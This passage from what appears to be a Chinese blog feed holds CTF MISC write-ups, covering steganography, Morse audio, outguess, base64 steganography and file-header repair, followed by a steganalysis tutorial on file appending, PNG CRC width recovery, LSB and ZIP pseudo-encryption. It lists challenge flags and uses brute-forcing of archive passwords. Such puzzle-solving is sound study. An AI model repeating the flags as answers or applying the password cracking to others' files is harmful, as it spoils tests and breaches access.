梅花香之苦寒来</h1><p>打开压缩文件，得到一个文件夹，里面有一个jpg文件。<br>使用010editor工具打开，发现图片数据之后有一大串16进制数据。将16进制数据复制到在线网站直接转为txt文件。<br>打开txt文件发现是一系列二维坐标。<br>那么根据提示是需要二维坐标绘图，在Linux下使用gnuplot工具，使用这个工具需要把坐标转化为 <code>A B</code> 的形式，直接把 <code>(A,B)</code> 替换即可。<br>需要下载(之前网上某个教程居然叫下压缩包自己编译，又麻烦又容易出错，简直蠢到家了)，直接使用命令即可：<br><code>apt-get install gnuplot</code><br>绘制出二维码，然后截图保存为二维码的png文件，拿到QR Research识别。得到flag：<br><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p><p>这道题也花了不少时间，一个小时左右。主要一开始不想用Linux的这个gnuplot工具，觉得麻烦。为此去试了下python的绘图工具，但出错了。兜兜转转还是选择了这个。<br>很烦欸。</p><h1 id="49-HBNIS2018-excel破解"><a href="#49-HBNIS2018-excel破解" class="headerlink" title="49 - [HBNIS2018]excel破解"></a>49 - [HBNIS2018]excel破解</h1><p>直接拿到010editor，搜索flag，结束：<br><code>flag&#123;office_easy_cracked&#125;</code></p><h1 id="50-穿越时空的思念"><a href="#50-穿越时空的思念" class="headerlink" title="50 - 穿越时空的思念"></a>50 - 穿越时空的思念</h1><p>下载了一段mp3，打开一听明显是摩尔斯电码，但是用Audacity工具打开发现音频有问题，这里不再演示。<br>这个题解不错，推荐一下：<a href="https://www.cnblogs.com/tac2664/p/13861595.html">题解</a><br>用Audacity工具将音频完全转化为右声道，这样就只有摩尔斯电码的声音了。<br>然后导出为wav文件，拿到kali使用morse2ascii工具: <code>morse2ascii xxx.wav</code><br>顺带一提morse2ascii工具在kali下安装方法: <code>apt-get install morse2ascii</code><br>flag：<br><code>flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</code></p><h1 id="51-HBNIS2018-来题中等的吧"><a href="#51-HBNIS2018-来题中等的吧" class="headerlink" title="51 - [HBNIS2018]来题中等的吧"></a>51 - [HBNIS2018]来题中等的吧</h1><p>打开压缩文件，得到一个png<br>从png看是一个摩尔斯电码：<br><code>.- .-.. .--. .... .- .-.. .- -...</code><br>得到：<br><code>flag&#123;alphalab&#125;</code></p><h1 id="52-ACTF新生赛2020-outguess"><a href="#52-ACTF新生赛2020-outguess" class="headerlink" title="52 - [ACTF新生赛2020]outguess"></a>52 - [ACTF新生赛2020]outguess</h1><p>打开压缩文件，得到一个jpg，一个txt和一个zip文件。<br>txt无有效信息，jpg的属性里面有一个：<br><code>公正民主公正文明公正和谐</code><br>是社会主义核心价值观加解密，拿去解密得到：<br><code>abc</code><br>结合题目可知是outguess工具图片隐写。<br>在kali下使用命令安装outguess：<br><code>apt install outguess</code><br>outguess解密：<br><code>outguess -k &quot;abc&quot; -r mmm.jpg input.txt</code><br>打开txt文件，flag整理得：<br><code>flag&#123;gue33_Gu3Ss!2020&#125;</code></p><h1 id="53-谁赢了比赛？"><a href="#53-谁赢了比赛？" class="headerlink" title="53 - 谁赢了比赛？"></a>53 - 谁赢了比赛？</h1><p>打开压缩包，得到一张包含围棋棋谱的png<br>一开始以为是什么棋谱之类的加密，但后来发现不是。<br>拿去使用binwalk和foremost分离文件。<br>然后得到一个rar文件。<br>发现需要密码，使用4位纯数字爆破，得到密码1020<br>打开rar文件，得到一个txt和gif文件，txt文件里无有效信息。<br>使用Stegsolve工具，用Frame Browser将gif逐帧播放，发现第310帧有一串文字，将这一帧文件保存为bmp文件。<br>再用Stegsolve工具打开bmp文件，在Red 0通道发现了二维码。使用QR Research读取到flag：<br><code>flag&#123;shanxiajingwu_won_the_game&#125;</code></p><h1 id="54-WUSTCTF2020-find-me"><a href="#54-WUSTCTF2020-find-me" class="headerlink" title="54 - [WUSTCTF2020]find_me"></a>54 - [WUSTCTF2020]find_me</h1><p>从属性栏找到以下盲文：<br><code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code><br>解密得：<br><code>wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code><br>整理flag得：<br><code>flag&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code></p><h1 id="55-SWPU2019-我有一只马里奥"><a href="#55-SWPU2019-我有一只马里奥" class="headerlink" title="55 - [SWPU2019]我有一只马里奥"></a>55 - [SWPU2019]我有一只马里奥</h1><p>打开压缩文件，得到一个exe文件，点击exe文件，得到一个1.txt<br>打开txt文件，得到提示信息：<br><code>ntfs      flag.txt</code><br>那么搜索ntfs相关的工具，得到NtfsStreamEditor工具，下载后打开：<br>设置路径为exe存在的目录，得到flag.txt文件。然后导出该文件。<br>打开flag.txt文件，得到flag：<br><code>flag&#123;ddg_is_cute&#125;</code></p><h1 id="56-GUET-CTF2019-KO"><a href="#56-GUET-CTF2019-KO" class="headerlink" title="56 - [GUET-CTF2019]KO"></a>56 - [GUET-CTF2019]KO</h1><p>使用 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook!</a> 可得到flag:<br><code>flag&#123;welcome to CTF&#125;</code></p><h1 id="57-GXYCTF2019-gakki"><a href="#57-GXYCTF2019-gakki" class="headerlink" title="57 - [GXYCTF2019]gakki"></a>57 - [GXYCTF2019]gakki</h1><p>打开压缩包得到一张jpg，010editor查看发现有文件附加，直接用foremost分离得到rar文件<br>然后使用ARCHPR工具4位纯数字爆破，得到密码8864<br>然后得到flag.txt，打开一看是完全无序的字符，一开始以为是什么文件，做成了16进制文件发现并不是。<br>思考良久后，使用了频率统计的方式。<br>可以随便找一个在线网站频率统计，也可以用python写一个频率统计的脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到：<br><code>GXY&#123;gaki_IsMyw1fe&#125;</code><br>整理得：<br><code>flag&#123;gaki_IsMyw1fe&#125;</code></p><h1 id="58-ACTF新生赛2020-base64隐写"><a href="#58-ACTF新生赛2020-base64隐写" class="headerlink" title="58 - [ACTF新生赛2020]base64隐写"></a>58 - [ACTF新生赛2020]base64隐写</h1><p>打开压缩包得到一个tar文件，解压得到两个zip，将 近在眼前.zip 再解压得到一个png和一个txt，png是公众号二维码无用，txt全是base64编码的数据。<br>看出来应该是base64隐写类型。<br>那么在网上找了个python脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">            <span class="comment"># print(flag) 这样写得不出正确结果</span></span><br><span class="line">        <span class="built_in">print</span>([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>用脚本跑了一遍得到了flag：<br><code>flag&#123;6aseb4_f33!&#125;</code></p><h1 id="59-MRCTF2020-ezmisc"><a href="#59-MRCTF2020-ezmisc" class="headerlink" title="59 - [MRCTF2020]ezmisc"></a>59 - [MRCTF2020]ezmisc</h1><p>打开压缩包得到一个png<br>打开图片感觉是一个修改了宽高的图片，用010editor工具修改宽高，图片有明显变化，于是继续修改宽高，得到flag：<br><code>flag&#123;1ts_vEryyyyyy_ez!&#125;</code></p><h1 id="60-caesar"><a href="#60-caesar" class="headerlink" title="60 - caesar"></a>60 - caesar</h1><p>打开txt文件，得到描述信息：<br><code>gmbhjtdbftbs</code><br>由于题目是caesar，中文意思为凯撒<br>那么明显是凯撒加密<br>那么使用在线工具解密，偏移量为1<br>得到flag：<br><code>flag&#123;flagiscaesar&#125;</code></p><h1 id="61-SWPU2019-伟大的侦探"><a href="#61-SWPU2019-伟大的侦探" class="headerlink" title="61 - [SWPU2019]伟大的侦探"></a>61 - [SWPU2019]伟大的侦探</h1><p>打开压缩文件，发现需要密码才能打开misc文件夹，而txt文件不需要，所以直接解压出txt文件。<br>然后txt文件打开，发现需要更改编码才能看到正确的密码，于是打开010editor工具，在右下角改编码为EBCDIC<br>得到正确的密码：<br><code>wllm_is_the_best_team!</code><br>然后成功解压出misc文件夹，里面是18张jpg文件，是跳舞小人，福尔摩斯中的加解密方式。<br>于是搜索对应的密码表，分别一一对应，得到flag：<br><code>flag&#123;iloveholmesandwllm&#125; </code></p><h1 id="62-黑客帝国"><a href="#62-黑客帝国" class="headerlink" title="62 - 黑客帝国"></a>62 - 黑客帝国</h1><p>打开压缩文件，得到一个txt文件。打开是大量的字符，看起来没什么规律，但是仔细看开头 <code>52 61 72 21</code> 。这是rar文件头，于是使用在线工具将16进制转为文件，得到一个rar。<br>rar文件有密码，用ARCHPR工具4位数字爆破，得到了密码。<br>打开rar文件，是一个png文件，但是打不开。<br>使用010editor工具仔细看，发现并不是png文件，而是jpg文件，将文件头前4位改为 <code>FF D8 FF E0</code><br>再将文件扩展名改为jpg<br>打开拿到flag：<br><code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</code></p><h1 id="63-HBNIS2018-低个头"><a href="#63-HBNIS2018-低个头" class="headerlink" title="63 - [HBNIS2018]低个头"></a>63 - [HBNIS2018]低个头</h1><p>考得很妙。<br>打开txt文件，得到密文：<br><code>EWAZX RTY TGB IJN IO KL</code><br>低个头，指看键盘。<br>得到flag：<br><code>flag&#123;CTF&#125;</code></p><h1 id="64-MRCTF2020-你能看懂音符吗"><a href="#64-MRCTF2020-你能看懂音符吗" class="headerlink" title="64 - [MRCTF2020]你能看懂音符吗"></a>64 - [MRCTF2020]你能看懂音符吗</h1><p>下载了压缩文件后，发现格式不正确，打开010editor工具，发现文件头有误，修改为rar正确的文件头: <code>52 61 72 21</code><br>rar文件能够正常打开，得到一个docx文件。发现格式不对，使用010editor工具，发现文件头是 <code>50 4B 03 04</code><br>这是zip文件头，于是把文件扩展名修改为zip，打开得到一些xml和其它文件。<br>逐个打开查看，在word文件夹下的document.xml文件，用浏览器打开，发现音符，使用在线音符解密，得到：<br><code>MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</code><br>整理flag：<br><code>flag&#123;thEse_n0tes_ArE_am@zing~&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;MISC杂项的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="MISC杂项" scheme="http://example.com/categories/CTF/MISC%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MISC杂项之隐写分析</title>
    <link href="http://example.com/2023/10/31/MISC%E6%9D%82%E9%A1%B9%E4%B9%8B%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/10/31/MISC%E6%9D%82%E9%A1%B9%E4%B9%8B%E9%9A%90%E5%86%99%E5%88%86%E6%9E%90/</id>
    <published>2023-10-30T16:00:00.000Z</published>
    <updated>2023-11-03T09:53:20.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为找不到工作，就学些自己感兴趣的东西了…惨</p><span id="more"></span><h1 id="隐写分析"><a href="#隐写分析" class="headerlink" title="隐写分析"></a>隐写分析</h1><p>简单来说，就是获取隐藏的信息。<br>隐写分析是 Misc 中最为重要的项目之一，包括文件分析、信息隐写等等，涉及巧妙的编码、隐藏数据、层层嵌套的文件中的文件等等于杂项一样，它也喜欢考察一些并非为我们所掌握的小知识，比如一些从来没听说过的乱七八糟的密码（比如与佛论禅加密、颜文字加密等等），我们需要善用自己的信息搜集能力。</p><h1 id="直接附加"><a href="#直接附加" class="headerlink" title="直接附加"></a>直接附加</h1><h2 id="识别文件类型"><a href="#识别文件类型" class="headerlink" title="识别文件类型"></a>识别文件类型</h2><p>1、 Linux命令: file<br>用法: <code>file filename</code><br>用于识别文件类型，若文件头残缺或文件头错误，则显示data，表示无法识别。<br>2、 16进制编辑器工具：<strong>010 Editer</strong> 或者 <strong>WinHex</strong><br>可查看文件头类型，根据文件头判断文件类型</p><p>文件的扩展名往往反映了文件的类型，但又不一定准确，因为我们可以随意地去修改它。<br>比如我们把可以一个 jpg 图片文件改名成 xxx.png，无论我们学过学过计算机知识都应该知道 JPG 和 PNG 不是同一个东西，但是我们双击却依然可以用图片查看器查看这张图片，这说明程序有自己的方式去判断这是什么类型的文件，从而选择读取这张图片内容的方式，这就是文件头的作用。<br>大部分文件类型有其固定的文件结构，基本结构为：<br><code>文件头 + 文件内容 + 文件尾(部分无)</code><br>图片查看器打开图片文件时，首先会根据文件头判断它是哪种类型的文件，然后再根据文件类型选择恰当的读取方式。<br>一般来说，程序在读取有文件尾的文件时一般只会读到文件尾，并不会关注后面还有没有别的内容。</p><p>所以对于有文件尾的文件类型A来说，文件尾之后的内容往往不会对文件的查看有影响，增加的内容普通情况下不会被发现（拿十六进制编辑器不算普通情况）。我们可以往它的文件尾后面添加字符，数字，甚至是藏一个别的文件，这就是直接附加。</p><h2 id="分离文件"><a href="#分离文件" class="headerlink" title="分离文件"></a>分离文件</h2><p>要分离出附加在文件A后面的文件，可以通过在十六进制编辑器中观察文件尾后中隐含的文件头信息来判断文件A中附加的文件类型，从而进行提取，常见文件类型文件头（尾）如下：</p><table><thead><tr><th>文件类型</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG(jpg)</td><td>FF D8 FF</td><td>FF D9</td></tr><tr><td>PNG</td><td>89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>GIF</td><td>47 49 46 38</td><td>00 3B</td></tr><tr><td>ZIP</td><td>50 4B 03 04</td><td>50 4B</td></tr><tr><td>RAR</td><td>52 61 72 21</td><td>&#x2F;</td></tr><tr><td>Wave(wav)</td><td>57 41 56 45</td><td>&#x2F;</td></tr></tbody></table><p>使用工具：<br><strong>Binwalk</strong>(Kali自带)<br><strong>Foremost</strong>(Linux下安装: <code>apt-get install foremost</code> )<br><strong>dd</strong> 当无法自动分离时，用dd实现文件手动分离<br>分离文件A中附加的其他文件，Binwalk 可以自动分析一个文件中包含的多个文件并将它们提取出来<br>Foremost 也可以分离文件而且有时候更好用一点<br>可以先用 Binwalk 进行分析，如果有隐藏文件再用 Foremost 分离</p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">binwalk [文件A]   # 分析文件A</span><br><span class="line">binwalk -e [文件A]    # 分析文件A后自动提取已知的文件类型的隐藏文件</span><br><span class="line">foremost [文件A]      # 分离文件A的隐藏文件，</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">存到与文件A同目录的output文件夹中，同时在文件夹中生成一个日志文件</span></span><br></pre></td></tr></table></figure><p>例题：BUUCTF - 二维码<br>注意分离出png文件和zip文件后，zip文件有密码，需要使用ARCHPR软件破解密码，直接使用数字暴力破解即可。密码是7639</p><h2 id="文件合并操作"><a href="#文件合并操作" class="headerlink" title="文件合并操作"></a>文件合并操作</h2><p>Linux下cat命令：<br><code>cat file1 file2 &gt; file3</code><br>可利用md5校验是否正确合并</p><h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学,英文写作Steganography。</p><h2 id="png文件结构"><a href="#png文件结构" class="headerlink" title="png文件结构"></a>png文件结构</h2><p><code>文件头（89 50 4E 47 0D 0A 1A 0A） + 数据块 + 数据块 + 数据块…… + 文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82）</code><br>PNG 定义了两种类型的数据块，一种是称为关键数据块，这是标准的数据块，另一种叫做辅助数据块，这是可选的数据块。关键数据块定义了4个标准数据块，每个 PNG 文件都必须包含它们。</p><p>IHDR（文件头数据块）<br>第一块是文件头数据块（IHDR），它由第11——32字节组成（从0开始），包含有 PNG 文件中存储的图像数据的基本信息，数据从第 16字节开始，有13个字节，其前8字节分别用4个字节规定了图片的宽和高（十六进制，以像素为单位）。</p><p>IDAT（图像数据块）<br>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。它采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩。</p><h2 id="IHDR-篡改图片宽高"><a href="#IHDR-篡改图片宽高" class="headerlink" title="IHDR 篡改图片宽高"></a>IHDR 篡改图片宽高</h2><p>IHDR 的前8字节规定了图片的宽和高，我们可以用十六进位文件编辑器更改它们以使得这张图片显示不完整，从而达到隐藏信息的目的。此时它的图片数据并没有变，在Windows图片查看器中超过规定的图片宽高的部分只是不显示了。<br>当修改了IHDR时，会提示 IHDR CRC error<br>这是因为在每个数据块的最后4字节都有CRC（循环冗余检测）用来检测是否有错误和被篡改<br>可以利用 python 脚本反推图片原宽高，然后用十六进制编辑器打开图片修改图片宽高得到原图片。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用 python [脚本文件名] [图片文件名]</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n): </span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>PNG 文件中的图像像数一般是由 RGB 三原色（红绿蓝）组成（有的图片还包含A通道表示透明度），每一种颜色占用8位，取值范围为0x00至0xFF。LSB 隐写就是修改 RGB 颜色分量的最低二进制位（LSB），它修改了每个像数颜色的最低的1 bit，而人类的眼睛不会注意到这前后的变化，这样每个像素可以携带3比特的信息。</p><p>如果是要寻找这种 LSB 隐藏痕迹的话，有一个工具 Stegsolve 是个神器，可以来辅助我们进行分析。通过下方的按钮观察每个通道的信息，我们可以捕捉异常点，抓住 LSB 隐写的蛛丝马迹（这玩意儿很难说，一般就是一看就感觉奇怪的n行或n列颜色块），进而利用 Stegsolve –&gt; Analyse –&gt; Data Extract 功能指定通道进行提取。</p><p>对于PNG和BMP文件中的 LSB 等常见的隐写方式，我们也可以使用 zsteg 工具直接进行自动化的识别和提取。</p><h2 id="IDAT隐写"><a href="#IDAT隐写" class="headerlink" title="IDAT隐写"></a>IDAT隐写</h2><p>IDAT 块只有当上一个块充满（正常length最大65524）时，才会继续一个新的块。程序读取图像的时候也会在 第一个未满的块停止 （查了下W3C标准，其实是PNG图片在压缩的时候会在最后一个块的标记位标明这是最后一个数据块）。所以如果某一块没有满但后面却还有 IDAT 块则说明后面的块是“假”的。</p><p>我们可以用 pngcheck -v [文件名] 去查看PNG文件数据块信息，然后利用 python zlib 解压多余IDAT块的内容，此时注意剔除长度、数据块类型及末尾的CRC校验值。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">IDAT = <span class="string">&quot; &quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)    <span class="comment">#双引号中填IDAT数据</span></span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/62895080">隐写术之图片隐写</a></p><h1 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h1><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包<br>一个 ZIP 文件由三个部分组成：<br>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p><p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zhuanlan.zhihu.com/p/599530557">从0开始学杂项</a><br><a href="https://cloud.tencent.com/developer/article/2069964">常见隐写工具</a><br><a href="https://codeantenna.com/a/H0NwncBJZh">F5隐写</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为找不到工作，就学些自己感兴趣的东西了…惨&lt;/p&gt;</summary>
    
    
    
    <category term="MISC杂项" scheme="http://example.com/categories/MISC%E6%9D%82%E9%A1%B9/"/>
    
    <category term="隐写" scheme="http://example.com/categories/MISC%E6%9D%82%E9%A1%B9/%E9%9A%90%E5%86%99/"/>
    
    
    <category term="MISC杂项" scheme="http://example.com/tags/MISC%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>埃隆马斯克传--与风共舞的孩子</title>
    <link href="http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E4%B8%8E%E9%A3%8E%E5%85%B1%E8%88%9E%E7%9A%84%E5%AD%A9%E5%AD%90/"/>
    <id>http://example.com/2023/10/13/%E5%9F%83%E9%9A%86%E9%A9%AC%E6%96%AF%E5%85%8B%E4%BC%A0--%E4%B8%8E%E9%A3%8E%E5%85%B1%E8%88%9E%E7%9A%84%E5%AD%A9%E5%AD%90/</id>
    <published>2023-10-12T16:00:00.000Z</published>
    <updated>2023-11-07T15:52:53.341Z</updated>
    
